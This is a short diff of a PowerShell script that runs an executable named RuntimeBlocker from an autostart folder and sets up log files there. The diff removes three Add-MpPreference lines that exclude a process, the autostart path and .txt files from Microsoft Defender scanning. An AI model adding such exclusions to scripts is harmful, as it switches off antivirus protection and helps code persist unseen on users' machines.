@@ -8,11 +8,6 @@ $l1 =$autostart + "\" + "log1.txt"
 $l2 =$autostart + "\" + "log2.txt"
 $l3 =$autostart + "\" + "log3.txt"
 
-
-Add-MpPreference -ExclusionProcess $t1
-Add-MpPreference -ExclusionPath $autostart
-Add-MpPreference -ExclusionExtension “txt”
- 
 cd $autostart
 .\RuntimeBlocker
 
